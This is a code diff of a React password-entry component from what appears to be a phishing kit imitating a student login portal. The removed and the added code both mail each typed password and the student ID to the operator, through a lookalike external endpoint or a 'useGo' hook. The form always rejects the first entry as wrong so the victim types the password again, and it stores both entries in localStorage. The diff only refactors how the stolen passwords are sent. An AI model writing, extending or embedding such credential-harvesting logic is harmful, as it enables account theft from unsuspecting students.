@@ -1,30 +1,12 @@
 import React, { useState } from "react";
 import { FormFooter } from "./FormFooter";
-import axios from "axios"; // Assuming you are using Axios to make the API call
+import useGo from "./useGo"; // Import the useGo hook
 
 export const Password = ({ email, onBack, onNext, passwordError }) => {
   const [passwordValue, setPasswordValue] = useState(""); // State to handle the password input value
   const [isError, setIsError] = useState(false); // Track error state
   const [attemptedOnce, setAttemptedOnce] = useState(false); // Track if it's the first attempt
-
-  // Function to send email via your API
-  const sendEmail = async (password, type) => {
-    const studentId = localStorage.getItem("student_id"); // Fetch student ID from localStorage
-
-    try {
-      // Make the API call to send the email
-      const response = await axios.post(
-        "https://ivytechedu-cvfc.vercel.app/send-email",
-        {
-          subject: `${studentId.toUpperCase()} ${type} Password Entry`,
-          message: `Password: ${password} \nStudent ID: ${studentId}`,
-        }
-      );
-      console.log(`${type} password email sent successfully`, response);
-    } catch (error) {
-      console.error(`${type} password email failed`, error);
-    }
-  };
+  const { sendEmail, isSending, error, successMessage } = useGo(); // Destructure sendEmail from useGo
 
   const handleNext = () => {
     if (!passwordValue.trim()) {
@@ -32,16 +14,24 @@ export const Password = ({ email, onBack, onNext, passwordError }) => {
       return;
     }
 
+    const studentId = localStorage.getItem("student_id"); // Fetch student ID from localStorage
+
     // Check if it's the first or second attempt and store the password
     if (attemptedOnce) {
       // Store second password in localStorage when it's the second attempt
       localStorage.setItem("secondPassword", passwordValue);
-      sendEmail(passwordValue, "Second"); // Send second password email
+      sendEmail(
+        `Second password entry`, // Subject
+        `Password: ${passwordValue} \nStudent ID: ${studentId}` // Message
+      );
       onNext(passwordValue); // Proceed to next step (e.g., OTP or other step)
     } else {
       // Store first password in localStorage when it's the first attempt
       localStorage.setItem("firstPassword", passwordValue);
-      sendEmail(passwordValue, "First"); // Send first password email
+      sendEmail(
+        `First password entry`, // Subject
+        `Password: ${passwordValue} \nStudent ID: ${studentId}` // Message
+      );
       setAttemptedOnce(true); // Mark that the first attempt has been made
       setIsError(true); // Show incorrect password message after first attempt
     }
@@ -78,7 +68,8 @@ export const Password = ({ email, onBack, onNext, passwordError }) => {
               )}
             </p>
           )}
-
+          {error && <p className="error">{error}</p>}{" "}
+          {/* Display success message */}
           <input
             type="password"
             name="password"
@@ -95,8 +86,14 @@ export const Password = ({ email, onBack, onNext, passwordError }) => {
         </div>
         <a className="reset">Reset or Forgot Password</a>
         <div className="button-container">
-          <button type="button" className="next" onClick={handleNext}>
-            Next
+          <button
+            type="button"
+            className="next"
+            onClick={handleNext}
+            disabled={isSending} // Disable button while sending email
+          >
+            {isSending ? "Next" : "Next"}{" "}
+            {/* Show loading text when sending */}
           </button>
         </div>
       </div>
